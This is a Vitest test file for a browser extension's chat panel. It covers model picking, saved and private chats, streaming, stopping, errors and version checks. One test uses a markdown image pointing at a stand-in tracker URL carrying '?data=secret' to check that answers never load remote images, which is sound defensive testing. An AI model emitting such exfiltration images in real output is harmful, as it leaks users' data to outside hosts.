/**
 * @vitest-environment happy-dom
 */
import { act } from "react";
import { createRoot, type Root } from "react-dom/client";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

import { setClient } from "../lib/client";
import { resetConfigForTests } from "../lib/config";
import { installChromeFake } from "../test/chromeFake";
import { SERVER, createServerFake, frame, json, sse, textFrame, type ServerFake } from "../test/serverFake";
import Chat from "./Chat";
import type { Me } from "./types";

const ME: Me = {
  user: { username: "majid", display_name: "Majid A.", email: "m@example.com" },
  server: { name: "Alpharouter", url: SERVER },
  extension: { latest_version: "1.0.0.1", min_version: "1.0.0.0" },
  features: { chat: true, page_context: true, agent: false, auto_mode: false, private_mode: true },
  policy: { site_access: "per_site", allowed_sites: [], blocked_sites: [], page_content_models: [], agent_models: [], agent_max_steps: 25 },
};

const MODELS = [
  { id: "model::1", name: "GPT Test", kinds: ["text"] },
  { id: "model::2", name: "Image Only", kinds: ["image"] },
  { id: "model::3", name: "Default Chat", kinds: ["text"], default_kinds: ["chat"] },
];

let server: ServerFake;
let host: HTMLDivElement;
let root: Root;
const onDisconnect = vi.fn();
const onDisconnected = vi.fn();

beforeEach(() => {
  installChromeFake({ version: "1.0.0.1" });
  resetConfigForTests();
  server = createServerFake();
  server.routes["GET /api/chat/models"] = () => json(200, MODELS);
  onDisconnect.mockReset();
  onDisconnected.mockReset();
  host = document.createElement("div");
  document.body.appendChild(host);
  root = createRoot(host);
});

afterEach(() => {
  act(() => root.unmount());
  host.remove();
  setClient(null);
  vi.unstubAllGlobals();
});

async function render(me: Me = ME) {
  await act(async () => {
    root.render(<Chat me={me} server={SERVER} onDisconnect={onDisconnect} onDisconnected={onDisconnected} />);
  });
  await act(async () => undefined);
}

function button(label: string): HTMLButtonElement {
  const found = [...host.querySelectorAll("button")].find((b) => b.textContent === label || b.getAttribute("aria-label") === label);
  if (!found) throw new Error(`no ${label} button in: ${host.textContent}`);
  return found;
}

async function type(text: string) {
  const box = host.querySelector("textarea") as HTMLTextAreaElement;
  await act(async () => {
    const setter = Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, "value")!.set!;
    setter.call(box, text);
    box.dispatchEvent(new Event("input", { bubbles: true }));
  });
}

async function send(text: string) {
  await type(text);
  await act(async () => button("Send").click());
  await act(async () => undefined);
}

function answerWith(frames: string[]) {
  server.routes["POST /api/chat/completions"] = () => sse(frames).response;
}

describe("the model picker", () => {
  it("offers text models only, starting from the admin's chat default", async () => {
    await render();
    const options = [...host.querySelectorAll("option")].map((o) => o.textContent);
    expect(options).toEqual(["GPT Test", "Default Chat"]);
    expect((host.querySelector("select") as HTMLSelectElement).value).toBe("model::3");
  });

  it("remembers the user's choice", async () => {
    await chrome.storage.local.set({ "alpharouter.model": "model::1" });
    await render();
    expect((host.querySelector("select") as HTMLSelectElement).value).toBe("model::1");
    const select = host.querySelector("select") as HTMLSelectElement;
    await act(async () => {
      select.value = "model::3";
      select.dispatchEvent(new Event("change", { bubbles: true }));
    });
    expect((await chrome.storage.local.get("alpharouter.model"))["alpharouter.model"]).toBe("model::3");
  });
});

describe("a saved chat", () => {
  it("streams the answer and saves the turn on the server, then names the chat", async () => {
    answerWith([textFrame("Hello"), textFrame(", Majid"), frame({ alpha_router: { request_log_id: 9 } })]);
    server.routes["POST /api/chat/session-title"] = () => json(200, { title: "A greeting" });
    server.patterns.push([/^PATCH \/api\/user\/chats\/sessions\/[0-9a-f-]{36}$/, () => json(200, {})]);
    await render();
    await send("Hi there");
    expect(host.textContent).toContain("Hello, Majid");
    const [completion] = server.callsTo("POST", "/api/chat/completions");
    const body = completion.body as Record<string, unknown>;
    expect(body.model).toBe("model::3");
    expect(body.messages).toEqual([{ role: "user", content: "Hi there" }]);
    expect(body.persist_chat).toBe(true);
    expect(typeof body.chat_session_id).toBe("string");
    expect(body.user_message).toMatchObject({ role: "user", content: "Hi there", clientMessageId: expect.any(String), sentAt: expect.any(Number) });
    expect(typeof body.assistant_client_message_id).toBe("string");
    expect(body.private_mode).toBeUndefined();
    // Then the chat is named, as in the web app.
    await act(async () => undefined);
    const [titleCall] = server.callsTo("POST", "/api/chat/session-title");
    expect(titleCall.body).toEqual({
      model: "model::3",
      messages: [
        { role: "user", content: "Hi there" },
        { role: "assistant", content: "Hello, Majid" },
      ],
    });
    const [patch] = server.callsTo("PATCH", `/api/user/chats/sessions/${body.chat_session_id as string}`);
    expect(patch.body).toEqual({ title: "A greeting", titleGenerated: true });
  });

  it("keeps the same chat and history for the next question", async () => {
    answerWith([textFrame("One")]);
    server.routes["POST /api/chat/session-title"] = () => json(200, { title: "" });
    await render();
    await send("First");
    answerWith([textFrame("Two")]);
    await send("Second");
    const [first, second] = server.callsTo("POST", "/api/chat/completions").map((c) => c.body as Record<string, unknown>);
    expect(second.chat_session_id).toBe(first.chat_session_id);
    expect(second.messages).toEqual([
      { role: "user", content: "First" },
      { role: "assistant", content: "One" },
      { role: "user", content: "Second" },
    ]);
    // Named once, after the first answer.
    expect(server.callsTo("POST", "/api/chat/session-title")).toHaveLength(1);
  });

  it("starts over on New chat", async () => {
    answerWith([textFrame("One")]);
    server.routes["POST /api/chat/session-title"] = () => json(200, { title: "" });
    await render();
    await send("First");
    await act(async () => button("New chat").click());
    expect(host.textContent).not.toContain("First");
    answerWith([textFrame("Fresh")]);
    await send("Again");
    const [first, second] = server.callsTo("POST", "/api/chat/completions").map((c) => c.body as Record<string, unknown>);
    expect(second.chat_session_id).not.toBe(first.chat_session_id);
    expect(second.messages).toEqual([{ role: "user", content: "Again" }]);
  });
});

describe("a private chat", () => {
  it("is never saved and never named", async () => {
    answerWith([textFrame("Secret answer")]);
    await render();
    await act(async () => button("Private chat").click());
    expect(host.textContent).toContain("Private");
    await send("Keep this private");
    const body = server.callsTo("POST", "/api/chat/completions")[0].body as Record<string, unknown>;
    expect(body).toEqual({ model: "model::3", messages: [{ role: "user", content: "Keep this private" }], stream: true, private_mode: true });
    await act(async () => undefined);
    expect(server.callsTo("POST", "/api/chat/session-title")).toHaveLength(0);
  });

  it("is offered only when Private Mode is permitted", async () => {
    await render({ ...ME, features: { ...ME.features, private_mode: false } });
    expect([...host.querySelectorAll("button")].some((b) => b.textContent === "Private chat")).toBe(false);
  });
});

describe("stopping", () => {
  it("aborts the stream and tells the server to stop a saved chat", async () => {
    server.routes["POST /api/chat/completions"] = (init) => sse([textFrame("Partial")], { open: true, signal: init.signal }).response;
    await render();
    await send("Long question");
    expect(host.textContent).toContain("Partial");
    const sid = (server.callsTo("POST", "/api/chat/completions")[0].body as Record<string, unknown>).chat_session_id as string;
    server.routes[`POST /api/user/chat-sessions/${sid}/cancel-stream`] = () => json(200, {});
    await act(async () => button("Stop").click());
    await act(async () => undefined);
    expect(host.textContent).toContain("Stopped.");
    expect(server.callsTo("POST", `/api/user/chat-sessions/${sid}/cancel-stream`)).toHaveLength(1);
    expect(button("Send")).toBeTruthy();
  });
});

describe("when things go wrong", () => {
  it("shows an error frame in the answer", async () => {
    answerWith([textFrame("Par"), frame({ error: "Budget exceeded for this month" })]);
    await render();
    await send("Question");
    expect(host.querySelector('.turn--assistant [role="alert"]')?.textContent).toBe("Budget exceeded for this month");
  });

  it("shows the server's refusal", async () => {
    server.routes["POST /api/chat/completions"] = () =>
      json(403, { detail: { code: "extension_not_permitted", message: "The browser extension is not enabled for your account." } });
    await render();
    await send("Question");
    expect(host.textContent).toContain("not enabled for your account");
  });

  it("hands a disconnection back to the panel", async () => {
    server.routes["POST /api/chat/completions"] = () => json(401, { detail: { code: "revoked", message: "This browser was disconnected." } });
    await render();
    await send("Question");
    expect(onDisconnected).toHaveBeenCalledOnce();
  });

  it("leaves failed answers out of the next question", async () => {
    answerWith([frame({ error: "The provider is down" })]);
    await render();
    await send("First");
    answerWith([textFrame("Better")]);
    server.routes["POST /api/chat/session-title"] = () => json(200, { title: "" });
    await send("Second");
    const second = server.callsTo("POST", "/api/chat/completions")[1].body as Record<string, unknown>;
    expect(second.messages).toEqual([
      { role: "user", content: "First" },
      { role: "user", content: "Second" },
    ]);
  });
});

describe("answers", () => {
  it("never load remote images", async () => {
    answerWith([textFrame("Look: ![chart](https://tracker.example/pixel.png?data=secret)")]);
    await render();
    await send("Show me");
    expect(host.querySelector("img")).toBeNull();
    const link = host.querySelector("a.markdown__image-link") as HTMLAnchorElement;
    expect(link.textContent).toBe("Image: chart");
    expect(link.getAttribute("rel")).toContain("noopener");
  });

  it("can be copied", async () => {
    const writeText = vi.fn(async () => undefined);
    vi.stubGlobal("navigator", { ...navigator, clipboard: { writeText } });
    answerWith([textFrame("Copy me")]);
    await render();
    await send("Q");
    await act(async () => button("Copy answer").click());
    expect(writeText).toHaveBeenCalledWith("Copy me");
  });
});

describe("versions and permissions", () => {
  it("says when a newer version is available", async () => {
    await render({ ...ME, extension: { latest_version: "1.0.0.4", min_version: "1.0.0.0" } });
    expect(host.textContent).toContain("A new version of the extension is available");
  });

  it("stops a copy that is too old", async () => {
    await render({ ...ME, extension: { latest_version: "1.0.0.9", min_version: "1.0.0.5" } });
    expect(host.textContent).toContain("too old");
    expect(host.querySelector("textarea")).toBeNull();
  });

  it("says when the extension is off for the user, and still lets them disconnect", async () => {
    await render({ ...ME, features: { ...ME.features, chat: false }, policy: null });
    expect(host.textContent).toContain("not enabled for your account");
    await act(async () => button("Disconnect").click());
    expect(onDisconnect).toHaveBeenCalledOnce();
  });
});

